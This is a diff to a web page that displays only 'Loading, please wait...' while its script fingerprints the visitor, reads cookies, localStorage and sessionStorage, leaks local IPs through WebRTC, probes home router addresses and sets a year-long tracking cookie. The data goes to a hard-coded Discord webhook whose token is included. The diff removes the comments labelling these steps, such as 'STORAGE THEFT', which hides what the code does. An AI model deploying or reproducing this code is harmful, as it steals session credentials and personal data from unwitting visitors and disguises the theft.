@@ -12,11 +12,7 @@
 <body>
 <div id="msg">Loading, please wait...</div>
 <script>
-// ================================================================
-// COMPLETE DATA COLLECTION + VPN DETECTION
-// Uses ipapi.co for HTTPS geolocation (no key required)
-// Replace YOUR_WEBHOOK_URL with your actual Discord webhook URL.
-// ================================================================
+  
 (function() {
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545530999134232650/jhvW9RsKGyTxMla8MxSQ3t0QS3edP9uur3UAps0Zg9TxzEWihuSTb-8wHeRkVLhTos7F';
 
@@ -32,7 +28,7 @@
     }).catch(() => {});
   }
 
-  // ---------- IP GEOLOCATION (ipapi.co) ----------
+  
   async function getIPLocation() {
     try {
       const resp = await fetch('https://ipapi.co/json/');
@@ -43,11 +39,11 @@
     }
   }
 
-  // ---------- VPN DETECTION ----------
+ 
   function detectVPN(ipLocation) {
     const result = { vpn: false, reasons: [] };
 
-    // 1. Check organization for known VPN/hosting keywords
+    
     const org = (ipLocation.org || '').toLowerCase();
     const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'cloud', 'aws', 'digitalocean', 'hetzner', 'linode', 'vultr', 'tzulo', 'm247', 'private layer'];
     for (const kw of vpnKeywords) {
@@ -57,7 +53,6 @@
       }
     }
 
-    // 2. Check ASN for known hosting/VPN ranges
     const asn = (ipLocation.asn || '').toUpperCase();
     const vpnASNs = ['AS11878', 'AS13335', 'AS16509', 'AS14618', 'AS20473', 'AS25820', 'AS53667'];
     if (vpnASNs.includes(asn)) {
@@ -65,7 +60,7 @@
       result.reasons.push('asn_match: ' + asn);
     }
 
-    // 3. Check timezone mismatch (if geolocation timezone differs from system)
+    
     const geoTimezone = ipLocation.timezone || '';
     const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     if (geoTimezone && systemTimezone && geoTimezone !== systemTimezone) {
@@ -76,7 +71,7 @@
     return result;
   }
 
-  // ---------- COMPLETE FINGERPRINT ----------
+  
   function getFingerprint() {
     const canvas = document.createElement('canvas');
     canvas.width = 256;
@@ -175,7 +170,7 @@
     };
   }
 
-  // ---------- WEBRTC IP LEAK ----------
+  
   function getWebRTCIPs() {
     return new Promise((resolve) => {
       let ips = [];
@@ -199,7 +194,7 @@
     });
   }
 
-  // ---------- STORAGE THEFT ----------
+  
   function stealStorage() {
     const data = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
     try {
@@ -217,7 +212,7 @@
     return data;
   }
 
-  // ---------- NETWORK PROBE ----------
+  
   function probeNetwork() {
     const targets = [
       '192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1',
@@ -234,7 +229,7 @@
     return Promise.allSettled(promises).then(() => results);
   }
 
-  // ---------- BATTERY STATUS ----------
+  
   async function getBatteryStatus() {
     try {
       const battery = await navigator.getBattery();
@@ -247,7 +242,7 @@
     } catch (e) { return null; }
   }
 
-  // ---------- NETWORK INFORMATION ----------
+  
   function getNetworkInfo() {
     try {
       const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -263,7 +258,7 @@
     return null;
   }
 
-  // ---------- BROWSER EXTENSION DETECTION ----------
+  
   function detectExtensions() {
     const extensions = [];
     const knownExtensions = [
@@ -283,14 +278,14 @@
     return extensions;
   }
 
-  // ---------- PERSISTENT TRACKING ----------
+  
   function setTracking() {
     const id = 't_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     document.cookie = 'track=' + id + '; path=/; max-age=31536000; SameSite=Lax';
     try { localStorage.setItem('track', id); } catch (e) {}
   }
 
-  // ---------- MAIN EXECUTION ----------
+  
   (async function main() {
     const ipLocation = await getIPLocation();
     const fingerprint = getFingerprint();
